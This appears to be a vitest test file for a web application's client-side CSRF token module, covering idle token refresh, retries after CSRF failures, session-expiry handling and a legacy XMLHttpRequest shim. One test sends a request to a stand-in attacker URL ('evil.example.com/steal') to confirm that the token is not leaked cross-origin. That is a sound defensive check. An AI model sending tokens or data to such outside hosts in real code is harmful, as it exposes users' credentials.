import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';

const CSRF_REFRESH_AT_STORAGE_KEY = 'csrf_last_refresh_at';

let fetchMock;

function setupDom(token = 'initial-token-value-1234567890') {
    document.head.innerHTML = `<meta name="csrf-token" content="${token}">`;
    document.body.innerHTML = `
        <form id="test-form" method="POST" action="/save">
            <input type="hidden" name="csrf_token" value="${token}">
        </form>
    `;
}

function mockCsrfRefresh(token = 'refreshed-token-value-1234567890') {
    return {
        ok: true,
        status: 200,
        redirected: false,
        headers: { get: () => 'application/json' },
        json: async () => ({ csrf_token: token }),
    };
}

async function loadCsrfModule() {
    vi.resetModules();
    // csrf.js registers its init logic via a plain (non-idempotent)
    // document.addEventListener('DOMContentLoaded', ...) with no cleanup. Since
    // vitest's jsdom `document` persists across `it()` blocks in this file,
    // vi.resetModules() + import() gives each test a *fresh module instance*
    // but does NOT remove *previous* tests' stale DOMContentLoaded listeners —
    // a plain dispatchEvent() would re-run every prior test's init closure too
    // (re-registering their own periodic refresh timers against the *current*
    // fake clock, using their own long-stale fetch mocks), corrupting shared
    // state (localStorage timestamps, the DOM token) in later tests. Instead,
    // capture only the listener just registered by *this* import and invoke it
    // directly, leaving old listeners dormant.
    const addEventListenerSpy = vi.spyOn(document, 'addEventListener');
    await import('../../../app/static/js/core/csrf.js');
    const domReadyCall = addEventListenerSpy.mock.calls.find(([eventName]) => eventName === 'DOMContentLoaded');
    addEventListenerSpy.mockRestore();
    if (domReadyCall) {
        domReadyCall[1]();
    }
}

describe('csrf.js long-idle refresh handling', () => {
    beforeEach(() => {
        localStorage.clear();
        setupDom();
        window.__userIsAuthenticated = true;
        fetchMock = vi.fn().mockResolvedValue(mockCsrfRefresh());
        vi.stubGlobal('fetch', fetchMock);
    });

    afterEach(() => {
        vi.useRealTimers();
        vi.unstubAllGlobals();
        delete window.__userIsAuthenticated;
        delete window.refreshCSRFToken;
        delete window.refreshCSRFTokenIfStale;
        delete window.ensureFreshCsrfTokenForSubmit;
        delete window.getCSRFToken;
        delete window.csrfFetch;
    });

    it('stores only the refresh timestamp in localStorage on DOMContentLoaded (never the token value)', async () => {
        await loadCsrfModule();
        expect(localStorage.getItem(CSRF_REFRESH_AT_STORAGE_KEY)).not.toBeNull();
        // Regression guard: a cached token value must never live in localStorage,
        // since it can outlive the session/SECRET_KEY it was minted for and get
        // replayed into a later, unrelated session's forms.
        expect(localStorage.getItem('csrf_token_value')).toBeNull();
    });

    it('never overwrites a fresh, correctly-rendered form with an unrelated cached token', async () => {
        // Simulate leftover localStorage state from a completely different
        // session/server-restart (e.g. dev SECRET_KEY rotated on file save).
        localStorage.setItem('csrf_token_value', 'stale-foreign-token-value-1234567890');
        localStorage.setItem(CSRF_REFRESH_AT_STORAGE_KEY, String(Date.now()));

        await loadCsrfModule();

        // A freshly loaded page's own token is authoritative and must survive
        // a programmatic form.submit() untouched, since it isn't stale.
        const form = document.getElementById('test-form');
        form.submit();

        expect(document.querySelector('input[name="csrf_token"]').value)
            .toBe('initial-token-value-1234567890');
        expect(document.querySelector('meta[name="csrf-token"]').getAttribute('content'))
            .toBe('initial-token-value-1234567890');
    });

    it('refreshes before stale form submit after long idle', async () => {
        vi.useFakeTimers();
        vi.setSystemTime(new Date('2026-01-01T00:00:00Z'));
        fetchMock.mockResolvedValue(mockCsrfRefresh());

        await loadCsrfModule();
        vi.advanceTimersByTime(26 * 60 * 1000);

        const token = await window.ensureFreshCsrfTokenForSubmit();
        expect(token).toBe('refreshed-token-value-1234567890');
        expect(fetchMock).toHaveBeenCalledWith('/api/v1/csrf-token', expect.any(Object));
    });

    it('csrfFetch retries once after a JSON CSRF failure', async () => {
        await loadCsrfModule();

        fetchMock
            .mockResolvedValueOnce({
                ok: false,
                status: 400,
                headers: { get: () => 'application/json' },
                clone: () => ({
                    json: async () => ({ csrf_refresh_required: true, error: 'CSRF validation failed' }),
                }),
            })
            .mockResolvedValueOnce(mockCsrfRefresh('retry-token-value-1234567890'))
            .mockResolvedValueOnce({
                ok: true,
                status: 200,
                headers: { get: () => 'application/json' },
            });

        const response = await window.csrfFetch('/api/example', { method: 'POST', body: '{}' });

        expect(response.status).toBe(200);
        expect(fetchMock).toHaveBeenCalledTimes(3);
    });

    it('patches global fetch to refresh before stale unsafe requests', async () => {
        vi.useFakeTimers();
        vi.setSystemTime(new Date('2026-01-01T00:00:00Z'));
        fetchMock.mockImplementation((url) => {
            if (String(url).includes('/api/v1/csrf-token')) {
                return Promise.resolve(mockCsrfRefresh('idle-refreshed-token-1234567890'));
            }
            return Promise.resolve({
                ok: true,
                status: 200,
                headers: { get: () => 'application/json' },
                json: async () => ({ success: true }),
            });
        });

        await loadCsrfModule();
        vi.advanceTimersByTime(3 * 60 * 60 * 1000);

        const response = await window.fetch('/api/example', {
            method: 'POST',
            body: '{}',
            headers: { 'Content-Type': 'application/json' },
        });

        expect(fetchMock.mock.calls.some((call) => call[0] === '/api/v1/csrf-token')).toBe(true);
        expect(fetchMock.mock.calls.some((call) => call[0] === '/api/example')).toBe(true);
        expect(document.querySelector('meta[name="csrf-token"]').getAttribute('content'))
            .toBe('idle-refreshed-token-1234567890');
        expect(response.status).toBe(200);
    });

    it('does not proceed with unsafe fetch when refresh fails after long idle', async () => {
        vi.useFakeTimers();
        vi.setSystemTime(new Date('2026-01-01T00:00:00Z'));
        fetchMock.mockResolvedValue({
            ok: false,
            status: 500,
            redirected: false,
            headers: { get: () => 'text/html' },
        });

        await loadCsrfModule();
        vi.advanceTimersByTime(3 * 60 * 60 * 1000);

        await expect(window.fetch('/api/example', {
            method: 'POST',
            body: '{}',
            headers: { 'Content-Type': 'application/json' },
        })).rejects.toThrow('CSRF token unavailable');

        expect(fetchMock.mock.calls.some((call) => call[0] === '/api/example')).toBe(false);
    });

    it('does NOT permanently latch session-expired after a transient (non-redirected) server error', async () => {
        // A single 500/502/503 returning an HTML error page (deploy hiccup, proxy blip)
        // must not be conflated with an actually-expired session — a later retry should
        // still be able to refresh successfully.
        await loadCsrfModule();

        fetchMock.mockResolvedValueOnce({
            ok: false,
            status: 500,
            redirected: false,
            headers: { get: () => 'text/html' },
        });
        const first = await window.refreshCSRFToken();
        expect(first).toBeNull();

        fetchMock.mockResolvedValueOnce(mockCsrfRefresh('recovered-token-value-1234567890'));
        const second = await window.refreshCSRFToken();
        expect(second).toBe('recovered-token-value-1234567890');
    });

    it('latches session-expired on a 401/403 refresh response and short-circuits further attempts', async () => {
        await loadCsrfModule();

        fetchMock.mockResolvedValueOnce({
            ok: false,
            status: 401,
            redirected: false,
            headers: { get: () => 'application/json' },
        });
        const first = await window.refreshCSRFToken();
        expect(first).toBeNull();

        fetchMock.mockClear();
        const second = await window.refreshCSRFToken();
        expect(second).toBeNull();
        expect(fetchMock).not.toHaveBeenCalled();
    });

    it('latches session-expired when the refresh request was redirected (e.g. to /login)', async () => {
        await loadCsrfModule();

        fetchMock.mockResolvedValueOnce({
            ok: true,
            status: 200,
            redirected: true,
            headers: { get: () => 'text/html' },
        });
        const first = await window.refreshCSRFToken();
        expect(first).toBeNull();

        fetchMock.mockClear();
        const second = await window.refreshCSRFToken();
        expect(second).toBeNull();
        expect(fetchMock).not.toHaveBeenCalled();
    });
});

describe('csrf.js legacy XMLHttpRequest shim', () => {
    let originalXhrOpen;
    let originalXhrSend;
    let originalXhrSetRequestHeader;

    beforeEach(() => {
        localStorage.clear();
        setupDom();
        window.__userIsAuthenticated = true;

        // Replace the *pre-patch* prototype methods with no-op mocks so csrf.js's
        // DOMContentLoaded patch captures these (not jsdom's real implementations)
        // as its "original" fallbacks — avoids real network I/O in jsdom.
        originalXhrOpen = XMLHttpRequest.prototype.open;
        originalXhrSend = XMLHttpRequest.prototype.send;
        originalXhrSetRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
        XMLHttpRequest.prototype.open = vi.fn();
        XMLHttpRequest.prototype.send = vi.fn();
    });

    afterEach(() => {
        vi.unstubAllGlobals();
        XMLHttpRequest.prototype.open = originalXhrOpen;
        XMLHttpRequest.prototype.send = originalXhrSend;
        XMLHttpRequest.prototype.setRequestHeader = originalXhrSetRequestHeader;
        delete window.__userIsAuthenticated;
        delete window.getCSRFToken;
    });

    it('attaches X-CSRFToken to a same-origin legacy XHR request', async () => {
        await loadCsrfModule();
        const setHeaderMock = vi.fn();
        XMLHttpRequest.prototype.setRequestHeader = setHeaderMock;

        const xhr = new XMLHttpRequest();
        xhr.open('POST', '/api/v1/something');
        xhr.send();

        expect(setHeaderMock).toHaveBeenCalledWith('X-CSRFToken', 'initial-token-value-1234567890');
    });

    it('does NOT attach X-CSRFToken to a cross-origin legacy XHR request (token-leak regression guard)', async () => {
        await loadCsrfModule();
        const setHeaderMock = vi.fn();
        XMLHttpRequest.prototype.setRequestHeader = setHeaderMock;

        const xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://evil.example.com/steal');
        xhr.send();

        expect(setHeaderMock).not.toHaveBeenCalled();
    });
});
